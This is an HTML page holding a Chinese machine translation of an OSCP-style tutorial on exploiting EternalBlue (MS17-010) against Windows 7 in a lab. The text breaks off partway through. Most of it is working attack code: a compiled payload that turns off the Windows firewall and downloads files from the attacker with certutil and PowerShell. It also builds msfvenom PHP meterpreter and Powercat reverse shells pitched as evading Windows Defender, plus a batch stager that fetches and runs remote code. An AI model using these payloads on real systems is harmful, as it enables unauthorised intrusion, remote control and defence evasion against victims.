<html>
<head>
<title>Exploit Eternal Blue (MS17–010) for Window 7 and higher (custom payload)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">为Window 7和更高版本开发永恒之蓝(MS17–010)(自定义有效负载)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623?source=collection_archive---------0-----------------------#2022-06-18">https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623?source=collection_archive---------0-----------------------#2022-06-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b36b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">摘要<br/> </strong>本文向您展示如何在Windows 7或更高版本上利用MS17–010漏洞。</p><p id="e851" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">免责声明<br/> </strong>本文仅用于信息和教育目的，并面向那些愿意并好奇了解安全性和渗透测试的人。内容不得用于非法目的。如果你准备好学习新的好东西，那么继续读下去。</p><p id="71c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">详情<br/> </strong>为什么发这个帖子？</p><p id="7dcb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我的OSCP训练中，我很难找到永恒的蓝色目标。经过几个小时的故障排除，它终于工作了。我想让其他人不要浪费宝贵的实验时间。</p><p id="d516" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本演练是以这样的方式准备的，即它应该始终在运行Windows 7或更高版本的系统上工作，并且容易受到MS17–010的攻击。见我的另一个博客的Windows XP程序。</p><p id="20df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将利用“永恒之蓝”漏洞定制有效载荷。确切地说，我们将创建一个可执行文件:<br/> -不被Windows Defender软件检测为恶意软件<br/> -禁用Windows防火墙<br/> -在没有(访问)PowerShell的系统上工作</p><p id="9895" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最终结果可能是2个不同的反向shell(至少一个应该为您的目标工作):<br/> -一个“隐身”的Powercat反向shell(端口25) &gt;您在“Bruce”上得到这个… <br/> -一个“隐身”的meterpreter php反向shell(端口53)</p><p id="74cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">POC由两台机器组成:受害者(Windows 7位)和攻击者机器(Kali Linux 2022.1)。</p><p id="0691" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者:</p><ul class=""><li id="38f2" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">Windows 7专业版[版本6.1 7601] <br/> - IP地址:192.168.62.169 <br/> -安全性:默认Windows防火墙(启用所有配置文件)。</li></ul><p id="e410" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者(针对反向外壳):</p><ul class=""><li id="f57b" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">Kali Linux(我们将使用变量‘kali’或‘LHOST’)<br/>-IP地址:192.168.62.161</li></ul><p id="1527" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本指南中，我将交替使用术语“kali”和“LHOST”。您需要更改攻击者系统的ip地址。</p><p id="d43b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">先决条件<br/> </strong>我们从安装先决条件开始，在我们可以运行漏洞利用之前，这些先决条件必须到位。</p><p id="cee7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="3d39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载并安装最新版本的Impacket。设置目录全局可写(是的，这是必要的)。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="910b" class="ld le iq kz b gy lf lg l lh li">cd /opt<br/>sudo git clone <a class="ae lj" href="https://github.com/SecureAuthCorp/impacket.git" rel="noopener ugc nofollow" target="_blank">https://github.com/SecureAuthCorp/impacket.git</a><br/>sudo chmod 777 /opt/impacket -R</span></pre><p id="46f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="3491" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安装virtualenv工具。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="10aa" class="ld le iq kz b gy lf lg l lh li">sudo apt install virtualenv</span></pre><p id="902b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="1bab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Impacket目录中启动python2虚拟环境</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="782e" class="ld le iq kz b gy lf lg l lh li">cd /opt/impacket<br/>sudo virtualenv impacket-venv -p $(which python2)<br/>source impacket-venv/bin/activate</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lk"><img src="../Images/3ac097560f3f82b153a222043f070221.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BPPge8gmcPcam9zup2CMWQ.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">注意:如果您得到一个Python文件未找到的错误，只需再次执行该命令，它将工作。</figcaption></figure><p id="85fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果:您应该有一个对'(impacket-venv)'的提示更改。</p><p id="f4cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="cd3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在python2虚拟环境'(impacket-venv)'中，安装python2的pip。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="cce1" class="ld le iq kz b gy lf lg l lh li">cd /tmp                                                                                                                                               <br/>wget  <a class="ae lj" href="https://bootstrap.pypa.io/pip/2.7/get-pip.py" rel="noopener ugc nofollow" target="_blank">https://bootstrap.pypa.io/pip/2.7/get-pip.py</a> -O /tmp/get-pip.py --no-check-certificate<br/>sudo python2 get-pip.py</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lw"><img src="../Images/f89ad379c38a2ae0b5b78205599ed4a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l1fZAgHDYiwPfXo_QFkxMw.png"/></div></div></figure><p id="836f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="f2b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在python2虚拟环境'(impacket-venv)'内部，安装impacket需求</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="f2e4" class="ld le iq kz b gy lf lg l lh li">cd /opt/impacket<br/>pip install -r requirements.txt<br/>pip install .</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lx"><img src="../Images/457862e514f6ebf50fcbaf91031fcfa3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MeiFX_QbqpIp6VvsAnPrPA.png"/></div></div></figure><p id="b5da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">枚举。<br/> </strong>现在您已经根据运行漏洞的要求更新了您的系统，您可以开始扫描目标机器(在我们的例子中是Windows 7)。</p><p id="5a3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="298a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用nmap扫描目标计算机的SMB漏洞。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="ceb1" class="ld le iq kz b gy lf lg l lh li">cd /usr/share/nmap/scripts<br/>target=192.168.62.169<br/>p=445<br/>scriptargs='smbpass=','smbdomain=mydomain.com','unsafe=1'<br/>for script in $(ls smb* | grep -v -e brute -e flood); do echo "=== $script ==="; sudo nmap $(echo $target) -script=$script -script-args="${scriptargs}" -p $p| grep "|" ; done</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ly"><img src="../Images/8c9bd2b4a1262cee9042331192d02aeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lq1FCMLOClhxcpKP48U0TA.png"/></div></div></figure><p id="8b68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的目标机器易受MS17–010攻击！</p><p id="1e07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">有效负载创建(针对Window 7和更高版本)<br/> </strong>我们最终的有效负载将是一个可执行文件:<br/> -不会被Windows Defender软件删除<br/> -禁用Windows防火墙<br/> -在没有Powershell的系统上工作<br/> -将设置一个“隐身”Powercat反向shell(端口25) <br/> -将设置一个“隐身”meterpreter php反向shell(端口53)</p><p id="ef75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行该漏洞所需的一切都被复制到Kali上的/tmp目录中。我们将通过Python简单HTTP服务器提供这个目录。</p><p id="eb3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="6547" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">复制并粘贴下面的C代码以创建源文件/tmp/backup.c .(调整kali =<ip-address with="" your="" kali="" host=""/></p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="168d" class="ld le iq kz b gy lf lg l lh li">LHOST=192.168.62.161<br/>portweb=80<br/>rshell=shell-25.txt</span><span id="3d09" class="ld le iq kz b gy lz lg l lh li">cd /tmp<br/>echo '#include &lt;stdlib.h&gt;'&gt; testexe.c<br/>echo 'int main ()' &gt;&gt; testexe.c<br/>echo '{'&gt;&gt; testexe.c<br/>echo 'int i;' &gt;&gt; testexe.c<br/># Add user</span><span id="9470" class="ld le iq kz b gy lz lg l lh li">echo 'i = system ("netsh advfirewall set allprofiles state off");' &gt;&gt; testexe.c<br/># Download files<br/>echo i = system \("\"certutil.exe -urlcache -split -f \\"\""<a class="ae lj" href="http://${kali}:${portweb}/backup.bat\\" rel="noopener ugc nofollow" target="_blank">http://${LHOST}:${portweb}/backup.bat\\</a>"\"" C:\\\\\Windows\\\\\Tasks\\\\\\\backup.bat"\"\)\; &gt;&gt; testexe.c<br/>echo i = system \("\"certutil.exe -urlcache -split -f \\"\""<a class="ae lj" href="http://${kali}:${portweb}/php.exe\\" rel="noopener ugc nofollow" target="_blank">http://${LHOST}:${portweb}/php.exe\\</a>"\"" C:\\\\\Windows\\\\\Tasks\\\\\\\php.exe"\"\)\; &gt;&gt; testexe.c<br/>echo i = system \("\"certutil.exe -urlcache -split -f \\"\""<a class="ae lj" href="http://${kali}:${portweb}/php.exe\\" rel="noopener ugc nofollow" target="_blank">http://${LHOST}:${portweb}/php7.dll\\</a>"\"" C:\\\\\Windows\\\\\Tasks\\\\\\\php7.dll"\"\)\; &gt;&gt; testexe.c<br/>echo i = system \("\"powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('<a class="ae lj" href="http://${kali}:${portweb}/backup.bat','C:\\\\\Windows\\\\\Tasks\\\\\\\backup.bat'" rel="noopener ugc nofollow" target="_blank">http://${LHOST}:${portweb}/backup.bat','C:\\\\\Windows\\\\\Tasks\\\\\\\backup.bat'</a>)"\"\)\; &gt;&gt; testexe.c<br/># Execute files<br/>echo i = system \(\"ping -n 1 $LHOST\"\)\; &gt;&gt; testexe.c<br/>echo 'i = system ("START /B c:\\\\Windows\\\\Tasks\\\\backup.bat");' &gt;&gt; testexe.c<br/>echo i = system \(\"icacls c:\\\\\\Windows\\\\\\Tasks\\\\\\\\* /c /t /grant everyone:f\"\)\; &gt;&gt; testexe.c</span><span id="caf3" class="ld le iq kz b gy lz lg l lh li">echo 'return 0;' &gt;&gt; testexe.c <br/>echo '}' &gt;&gt; testexe.c</span></pre><p id="0a26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Result is source file /tmp/testexe.c</p><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ma"><img src="../Images/99554f3512533a6d3937a42bd08ce9e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k25AKLlqUkrOFUWK1Xf-IQ.png"/></div></div></figure><p id="397b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8. Performed on 192.168.62.161 (attacker machine, Kali Linux)</p><p id="a1ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Compile /tmp/testexec.c to /tmp/ruby.exe (ruby.exe is arbitrary, it can be something else if you want).</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="6b62" class="ld le iq kz b gy lf lg l lh li"># Compile as x86 Windows PE file<br/>/usr/bin/i686-w64-mingw32-gcc /tmp/testexe.c -o /tmp/ruby.exe</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/07c809ad69cb2568193b1d84b722d152.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*5a25gs7wFlWXCiBl_lgC5A.png"/></div></figure><p id="40c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">You have now created a Windows payload file. The next steps are to prepare the related files that will be called by the payload file (ruby.exe).</p><p id="d43c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">PHP meter preter reverse shell payloay<br/></strong>的值如果您确信可以在您的目标上使用PowerShell，您也可以跳过这一PHP部分，继续使用Powercat。您不需要调整ruby.exe文件(步骤7和8)。</p><p id="2b45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们最后的有效载荷文件(ruby.exe)将在TCP端口53上设置一个PHP meterpreter反向shell。这是通过以下代码行完成的:</p><p id="d0c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I = system(" certutil . exe-URL cache-split-f \ " http://192 . 168 . 62 . 161:80/backup . bat \ " C:\ \ Windows \ \ Tasks \ \ backup . bat ")；</p><p id="5719" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I = system(" certutil . exe-URL cache-split-f \ " http://192 . 168 . 62 . 161:80/PHP . exe \ " C:\ \ Windows \ \ Tasks \ \ PHP . exe ")；</p><p id="ba21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I = system(" certutil . exe-URL cache-split-f \ " http://192 . 168 . 62 . 161:80/PHP 7 . dll \ " C:\ \ Windows \ \ Tasks \ \ PHP 7 . dll ")；</p><p id="dfe9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在我的文章中读到更多关于“隐形”PHP Meterpreter shell的内容:</p><div class="mc md gp gr me mf"><a href="https://medium.com/@minix9800/evade-windows-defender-reverse-shell-detection-with-php-exe-and-metasploit-2ee0aabafedd" rel="noopener follow" target="_blank"><div class="mg ab fo"><div class="mh ab mi cl cj mj"><h2 class="bd ir gy z fp mk fr fs ml fu fw ip bi translated">使用php.exe和MetaSploit规避Windows Defender反向外壳检测。</h2><div class="mm l"><h3 class="bd b gy z fp mk fr fs ml fu fw dk translated">摘要</h3></div><div class="mn l"><p class="bd b dl z fp mk fr fs ml fu fw dk translated">medium.com</p></div></div><div class="mo l"><div class="mp l mq mr ms mo mt lq mf"/></div></div></a></div><p id="899b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">9.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="afbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载适用于Windows x86的php 7.x可执行文件。从*中提取所有文件。zip文件，并将2个相关文件复制到我们的暂存目录/tmp。检查<a class="ae lj" href="https://windows.php.net/downloads/releases" rel="noopener ugc nofollow" target="_blank">https://windows.php.net/downloads/releases</a>的最新7.x版本。复制最新的Win32 x86 php zip文件名。</p><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi mu"><img src="../Images/711d993e6d4e47072baf0044f506a567.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*STRtqP64-DlKudJJ.png"/></div></div></figure><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="3b68" class="ld le iq kz b gy lf lg l lh li">phpzip=php-7.4.30-nts-Win32-vc15-x86.zip<br/>mkdir /tmp/php-x86 2&gt;/dev/null<br/>wget <a class="ae lj" href="https://windows.php.net/downloads/releases/$%7Bphpzip" rel="noopener ugc nofollow" target="_blank">https://windows.php.net/downloads/releases/${phpzip</a>} -O /tmp/${phpzip}<br/>cd /tmp/php-x86<br/>unzip /tmp/${phpzip}</span><span id="b8ab" class="ld le iq kz b gy lz lg l lh li">cp /tmp/php-x86/php.exe /tmp<br/>cp /tmp/php-x86/php7.dll /tmp</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi mv"><img src="../Images/dbd63a301f3b752a86c8150a40d28f66.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*54QgOsH5lIGPuXOIQdQgxQ.png"/></div></div></figure><p id="db4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">10.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="38af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为PHP创建反向外壳代码</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="7ac4" class="ld le iq kz b gy lf lg l lh li">LHOST=192.168.62.161<br/>LPORT=53<br/>payload="reverse_php meterpreter_reverse_tcp"<br/>for payload in $(echo $payload); do msfvenom -p php/$payload LHOST=$LHOST LPORT=$LPORT -f raw &gt; /tmp/${payload}.php; done</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi mv"><img src="../Images/cd5b7613d24647a48f823f6f5e30b466.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P4Jf_AfZNV0uoQeXIWngTw.png"/></div></div></figure><p id="bd66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Powercat编码的反向shell有效负载<br/> </strong>我们最终的有效负载文件(ruby.exe)将在TCP端口25上设置一个“隐形”Powercat反向shell。这是通过以下代码行完成的:</p><p id="fb81" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I = System(" powershell . exe-c(New-Object System。Net.Webclient)。download file('<a class="ae lj" href="http://192.168.62.161:80/backup.bat','C:\\Windows\\Tasks\\backup.bat'" rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 62 . 161:80/backup . bat '，' C:\ \ Windows \ \ Tasks \ \ backup . bat '</a>))"；</p><p id="6171" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在我的文章中读到更多关于“隐形”Powercat反向外壳的信息:</p><div class="mc md gp gr me mf"><a href="https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1" rel="noopener  ugc nofollow" target="_blank"><div class="mg ab fo"><div class="mh ab mi cl cj mj"><h2 class="bd ir gy z fp mk fr fs ml fu fw ip bi translated">使用Powercat规避Windows Defender反向外壳检测</h2><div class="mm l"><h3 class="bd b gy z fp mk fr fs ml fu fw dk translated">摘要</h3></div><div class="mn l"><p class="bd b dl z fp mk fr fs ml fu fw dk translated">systemweakness.com</p></div></div><div class="mo l"><div class="mw l mq mr ms mo mt lq mf"/></div></div></a></div><p id="b26d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">11.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="bffc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载powercat.ps1，执行powercat并创建一个编码的有效负载文件(/tmp/shell-25.txt)。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="b3f2" class="ld le iq kz b gy lf lg l lh li">LHOST=192.168.62.161<br/>LPORT=25<br/>rshell=shell-25.txt<br/>pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" &gt; /tmp/$rshell</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi mv"><img src="../Images/813d1ff8564edb7a1e84f3699504e2ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TKQNGammgh1cmxH26IChJw.png"/></div></div></figure><p id="c34b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">12.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="fabb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">创建一个Windows批处理文件(/tmp/backup.bat)。这个批处理文件由我们的最终负载文件(ruby.exe)调用。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="26ac" class="ld le iq kz b gy lf lg l lh li">LHOST=192.168.62.161<br/>portweb=80<br/>rshell=shell-25.txt<br/>echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://${LHOST}:${portweb}/${rshell}');iex 'powershell -E \$code'" &gt;/tmp/backup.bat<br/>echo START /B c:\\Windows\\Tasks\\php.exe -d allow_url_fopen=true -r "eval(file_get_contents('http://$LHOST:$portweb/meterpreter_reverse_tcp.php'));" &gt;&gt;/tmp/backup.bat</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi mx"><img src="../Images/a0eb0bc96e03b5b6b5981f4bc7ae29ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fpcYFJ3G2anEiB6fGd-rmQ.png"/></div></div></figure><p id="f9d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">设置所需的监听器</strong></p><p id="b549" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来打开Bash终端的一个新实例。为每个“监听器”打开一个新标签。您需要为所有必需的侦听器打开5个选项卡。</p><p id="b9bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">13.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="e4a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置HTTP登台程序，以便将重要文件下载到目标。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="be25" class="ld le iq kz b gy lf lg l lh li">python3 -m http.server 80 — directory /tmp</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi my"><img src="../Images/f509a79bdb137148b169ff8770705516.png" data-original-src="https://miro.medium.com/v2/resize:fit:998/format:webp/1*Nyw5R2cdRyeMSN1wTwKnUQ.png"/></div></figure><p id="800f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">14.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="47f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置TCPdump ICMP侦听器(以解决网络问题)。在VPN上使用tun0。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="f2cb" class="ld le iq kz b gy lf lg l lh li">sudo tcpdump -i eth0 icmp</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/4d9b144eeaeaf5b83130b1d896ce9e6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*jwPwMjMze6E4vNgD2c4-fg.png"/></div></figure><p id="1143" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">15.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="a3f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在端口53上启动一个PHP Meterpreter侦听器来捕获PHP连接。</p><pre class="ku kv kw kx gt ky kz la lb aw lc bi"><span id="643d" class="ld le iq kz b gy lf lg l lh li">LHOST=192.168.62.161<br/>LPORT=53<br/>PAYLOAD=php/meterpreter_reverse_tcp<br/>sudo msfconsole -qn -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; run";</span></pre><figure class="ku kv kw kx gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi na"><img src="../Images/d6b503cabcdde0a3ebb876ab6e0839b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GBMDXhYb7OogpV1WPPYBLg.png"/></div></div></figure><p id="c529" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">16.在192.168.62.161上执行(攻击者机器，Kali Linux)</p><p id="3692" class="pw-post-body-paragraph jn jo iq jp b jq jr js 